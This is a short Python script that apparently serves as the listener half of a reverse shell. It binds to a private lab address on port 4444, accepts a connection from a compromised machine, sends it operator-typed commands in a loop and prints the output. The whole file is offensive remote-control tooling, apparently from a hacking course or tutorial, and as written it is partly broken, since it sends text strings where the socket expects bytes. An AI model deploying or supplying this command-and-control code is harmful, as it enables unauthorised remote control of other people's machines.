import socket

listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listner.bind(("192.168.197.128",4444))
listner.listen(0)
print("[+] Waiting for incoming Connection")
connection, address = listner.accept()
print("[+] Got a Connection" + str(address))

while True:
    command = input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)
